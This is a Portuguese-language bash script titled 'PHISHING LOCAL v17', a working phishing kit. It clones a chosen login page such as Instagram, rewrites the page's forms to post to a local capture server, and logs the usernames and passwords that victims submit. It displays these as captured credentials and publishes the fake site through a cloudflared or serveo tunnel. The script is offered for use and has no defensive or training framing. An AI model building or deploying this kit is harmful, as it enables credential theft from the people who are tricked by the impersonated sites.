#!/bin/bash
# ============================================
# 🎣 PHISHING LOCAL v17 - Simples e Direto
# 1 Clonar 2 Ver capturas 3 Túnel 4 Parar 0 Sair
# ============================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SITE_DIR="$SCRIPT_DIR/site_clone"
LOG_FILE="$SCRIPT_DIR/capturas.txt"
TUNNEL_PID="$SCRIPT_DIR/.tunnel.pid"
HISTORY_FILE="$SCRIPT_DIR/.history"
CAPTURED_DIR="$SCRIPT_DIR/captured_sites"

mkdir -p "$CAPTURED_DIR" "$SITE_DIR"

# =============================================
# OBTER IP AUTOMÁTICO
# =============================================
get_my_ip() {
    local ip=""
    ip=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    if [ -z "$ip" ]; then
        ip=$(ip addr 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
    fi
    [ -z "$ip" ] && ip="127.0.0.1"
    echo "$ip"
}

# =============================================
# CLONAR SITE (HTML + CSS + JS) VIA PROXYCHAINS
# =============================================
clone_site() {
    local target_url="$1"
    local redirect_url="$2"
    local port="${3:-8080}"

    rm -rf "$SITE_DIR"/*
    mkdir -p "$SITE_DIR"

    # curl com proxychains se disponível
    local curl_cmd="curl"
    if command -v proxychains4 &>/dev/null; then
        curl_cmd="proxychains4 curl"
        echo -e "${GREEN}  [ProxyChains ativo]${NC}"
    fi

    local ua="Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"

    # Baixar HTML
    echo -e "${YELLOW}[...] Baixando $target_url${NC}"
    eval "$curl_cmd -s -L -o '$SITE_DIR/index.html' -H 'User-Agent: $ua' '$target_url'" 2>/dev/null

    # Verificar se baixou algo
    if [ ! -s "$SITE_DIR/index.html" ]; then
        echo -e "${RED}[ERRO] Falha ao baixar o site. Verifique a URL ou conexão.${NC}"
        return 1
    fi

    echo -e "${GREEN}  HTML baixado ($(wc -c < "$SITE_DIR/index.html") bytes)${NC}"

    # Baixar CSS
    local css_links=$(grep -oP 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" | sed 's/href="//;s/"//')
    for css_url in $css_links; do
        local css_file="style_$(basename "$css_url" | head -c 30)"
        if [[ "$css_url" == http* ]]; then
            eval "$curl_cmd -s -L -o '$SITE_DIR/$css_file' '$css_file'" 2>/dev/null
        elif [[ "$css_url" == /* ]]; then
            local domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\1|')
            eval "$curl_cmd -s -L -o '$SITE_DIR/$css_file' '${domain}${css_url}'" 2>/dev/null
        fi
    done

    # Baixar JS
    local js_links=$(grep -oP 'src="[^"]*\.js[^"]*"' "$SITE_DIR/index.html" | sed 's/src="//;s/"//')
    for js_url in $js_links; do
        local js_file="script_$(basename "$js_url" | head -c 30)"
        if [[ "$js_url" == http* ]]; then
            eval "$curl_cmd -s -L -o '$SITE_DIR/$js_file' '$js_url'" 2>/dev/null
        elif [[ "$js_url" == /* ]]; then
            local domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\1|')
            eval "$curl_cmd -s -L -o '$SITE_DIR/$js_file' '${domain}${js_url}'" 2>/dev/null
        fi
    done

    # Modificar formulários pra captura (POST -> /login)
    sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"
    sed -i 's/<form[^>]*>/<form method="POST" action="\/login">/gi' "$SITE_DIR/index.html"

    # Trocar URLs do original pelo IP local
    local my_ip=$(get_my_ip)
    local domain=$(echo "$target_url" | sed -E 's|https?://||;s|/.*||; s|:.*||')
    sed -i "s|https\?://${domain}|http://${my_ip}:${port}|gI" "$SITE_DIR/index.html"

    # Salvar no histórico
    local site_name=$(echo "$domain" | tr '.' '_')
    local ts=$(date +%Y%m%d_%H%M)
    local hist_dir="$CAPTURED_DIR/${site_name}_${ts}"
    cp -r "$SITE_DIR" "$hist_dir"

    # Salvar config
    cat > "$SITE_DIR/.config" << EOF
TARGET_URL=$target_url
REDIRECT_URL=$redirect_url
PORT=$port
MY_IP=$my_ip
EOF

    # Adicionar ao histórico
    echo "${target_url}|${redirect_url}|${port}|$(date '+%Y-%m-%d %H:%M')|$hist_dir" >> "$HISTORY_FILE"

    echo ""
    echo -e "${GREEN}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║         ✅ CLONE REALIZADO!               ║${NC}"
    echo -e "${CYAN}╠═══════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║  ${WHITE}http://${my_ip}:${port}${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}Pressione Enter para iniciar o servidor...${NC}"
    read

    # Iniciar servidor
    REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" &
    echo "$!" > "$SCRIPT_DIR/.server.pid"
    sleep 1

    echo -e "${GREEN}[✓] Servidor rodando!${NC}"
}

# =============================================
# VER CAPTURAS (em tempo real via tail -f)
# =============================================
view_captures() {
    clear
    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║         📋 CREDENCIAIS CAPTURADAS       ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    if [ ! -f "$LOG_FILE" ] || [ ! -s "$LOG_FILE" ]; then
        echo -e "${RED}  Nenhuma captura ainda.${NC}"
        echo -e "${YELLOW}  (As credenciais aparecerão aqui em tempo real)${NC}"
    else
        echo -e "${WHITE}═══════════════════════════════════════════${NC}"
        cat "$LOG_FILE"
        echo -e "${WHITE}═══════════════════════════════════════════${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Limpar capturas${NC}"
    echo -e "${YELLOW}2) Ver em tempo real (Ctrl+C pra sair)${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    case $CHOICE in
        1)
            > "$LOG_FILE"
            echo -e "${GREEN}[✓] Capturas limpas.${NC}"
            ;;
        2)
            echo -e "${CYAN}  (Ctrl+C pra voltar ao menu)$${NC}"
            tail -f "$LOG_FILE" 2>/dev/null
            ;;
    esac
}

# =============================================
# TÚNEL (CLOUDFLARED - SEM LOGIN)
# =============================================
start_tunnel() {
    clear
    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║         🌐 TÚNEL PÚBLICO                ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
        echo -e "${RED}  Servidor não está rodando! Phish primeiro (opção 1).${NC}"
        echo ""
        echo -e "${YELLOW}Enter para voltar...${NC}"
        read
        return
    fi

    local port=$(grep 'PORT=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
    [ -z "$port" ] && port=8080

    if ! command -v cloudflared &>/dev/null; then
        echo -e "${YELLOW}  cloudflared não instalado.${NC}"
        echo -e "${WHITE}  pkg install -y cloudflared${NC}"
        echo -e "${YELLOW}  Ou use serveo/pkg:${NC}"
        echo -e "${WHITE}  ssh -R 80:localhost:$port serveo.net${NC}"
        echo ""
        echo -e "${YELLOW}Enter para voltar...${NC}"
        read
        return
    fi

    # Parar túnel anterior
    if [ -f "$TUNNEL_PID" ]; then
        kill $(cat "$TUNNEL_PID") 2>/dev/null
        rm -f "$TUNNEL_PID"
    fi
    pkill -f cloudflared 2>/dev/null

    echo -e "${YELLOW}[...] Iniciando túnel...${NC}"
    nohup cloudflared tunnel --url "http://localhost:$port" 2>/dev/null > "$SCRIPT_DIR/.tunnel.log" &
    local pid=$!
    echo "$pid" > "$TUNNEL_PID"

    sleep 5

    local tunnel_url=$(grep -oP 'https://[a-z0-9]+\.trycloudflare\.com' "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | head -1)

    if [ -n "$tunnel_url" ]; then
        echo ""
        echo -e "${GREEN}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  🌐 TÚNEL: ${WHITE}$tunnel_url${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════╝${NC}"
    else
        echo -e "${YELLOW}  Túnel iniciado. Verifique: $SCRIPT_DIR/.tunnel.log${NC}"
        echo -e "${WHITE}  Pode levar alguns segundos...${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Parar túnel${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    if [ "$CHOICE" = "1" ]; then
        [ -f "$TUNNEL_PID" ] && kill $(cat "$TUNNEL_PID") 2>/dev/null
        rm -f "$TUNNEL_PID"
        pkill -f cloudflared 2>/dev/null
        echo -e "${GREEN}[✓] Túnel parado.${NC}"
    fi
}

# =============================================
# HISTÓRICO
# =============================================
show_history() {
    clear
    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║         📜 HISTÓRICO                    ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    if [ ! -f "$HISTORY_FILE" ] || [ ! -s "$HISTORY_FILE" ]; then
        echo -e "${RED}  Sem clones no histórico.${NC}"
        echo ""
        echo -e "${YELLOW}Enter para voltar...${NC}"
        read
        return
    fi

    local count=0
    local all_urls=()
    while IFS='|' read -r url redirect port timestamp dir; do
        count=$((count + 1))
        all_urls+=("$url")
        echo -e "  ${GREEN}[$count]${NC} ${WHITE}$url${NC} ($timestamp)"
    done < "$HISTORY_FILE"

    echo ""
    echo -e "  ${RED}[0]${NC} Voltar"
    echo -n "Escolha: "
    read CHOICE

    [ "$CHOICE" = "0" ] && return

    if [ "$CHOICE" -gt 0 ] && [ "$CHOICE" -le "$count" ]; then
        local line=$(sed -n "${CHOICE}p" "$HISTORY_FILE")
        local target_url=$(echo "$line" | cut -d'|' -f1)
        local redirect_url=$(echo "$line" | cut -d'|' -f2)
        local port=$(echo "$line" | cut -d'|' -f3)
        local hist_dir=$(echo "$line" | cut -d'|' -f5)

        echo ""
        echo -e "${GREEN}  Site: ${WHITE}$target_url${NC}"
        echo -e "${YELLOW}1) Reusar (sem baixar de novo)${NC}"
        echo -e "${YELLOW}2) Baizar atualizado${NC}"
        echo -e "${YELLOW}Enter) Voltar${NC}"
        echo -n "> "
        read ACT

        [ -z "$ACT" ] && return

        if [ "$ACT" = "1" ]; then
            rm -rf "$SITE_DIR"/*
            cp -r "$hist_dir"/* "$SITE_DIR/"
            local my_ip=$(get_my_ip)
            sed -i "s|http://[0-9.]*:[0-9]*|http://${my_ip}:${port}|g" "$SITE_DIR/index.html"
            REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" &
            echo "$!" > "$SCRIPT_DIR/.server.pid"
            sleep 1
            echo -e "${GREEN}[✓] Servidor em http://${my_ip}:${port}${NC}"
        elif [ "$ACT" = "2" ]; then
            clone_site "$target_url" "$redirect_url" "$port"
        fi
    fi
}

# =============================================
# PARAR TUDO
# =============================================
stop_all() {
    [ -f "$SCRIPT_DIR/.server.pid" ] && kill $(cat "$SCRIPT_DIR/.server.pid") 2>/dev/null && rm -f "$SCRIPT_DIR/.server.pid"
    [ -f "$TUNNEL_PID" ] && kill $(cat "$TUNNEL_PID") 2>/dev/null && rm -f "$TUNNEL_PID"
    pkill -f "node.*server.js" 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    echo -e "${GREEN}[✓] Tudo parado.${NC}"
}

# =============================================
# MENU
# =============================================
while true; do
    clear
    echo -e "${PURPLE}"
    echo "╔═══════════════════════════════════════════════════╗"
    echo "║          🎣 PHISHING LOCAL v17                   ║"
    echo "╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC} 🎣 PHISH - Clonar site e iniciar"
    echo -e "  ${GREEN}2)${NC} 📋 CAPTURAS - Ver credenciais"
    echo -e "  ${GREEN}3)${NC} 🌐 TÚNEL - URL pública"
    echo -e "  ${GREEN}4)${NC} 📜 HISTÓRICO - Reusar clones"
    echo -e "  ${GREEN}5)${NC} 🛑 PARAR - Desligar tudo"
    echo ""
    echo -e "  ${RED}0)${NC} ❌ SAIR"
    echo ""
    echo -n "Escolha: "
    read OP

    case $OP in
        1)
            clear
            echo -e "${CYAN}═══ PHISH ═══${NC}"
            echo ""
            echo -e "${YELLOW}URL do site:${NC}"
            echo -e "${WHITE}Ex: https://instagram.com${NC}"
            echo -n "> "
            read URL
            [ -z "$URL" ] && continue

            echo -e "${YELLOW}Redirect (Enter = mesma URL):${NC}"
            echo -n "> "
            read REDIR
            [ -z "$REDIR" ] && REDIR="$URL"

            echo -e "${YELLOW}Porta (Enter = 8080):${NC}"
            echo -n "> "
            read PT
            [ -z "$PT" ] && PT=8080

            clone_site "$URL" "$REDIR" "$PT"
            ;;
        2)
            view_captures
            ;;
        3)
            start_tunnel
            ;;
        4)
            show_history
            ;;
        5)
            stop_all
            echo -e "${YELLOW}Enter...${NC}"
            read
            ;;
        0)
            stop_all
            exit 0
            ;;
        *)
            echo -e "${RED}Inválido!${NC}"
            ;;
    esac
done
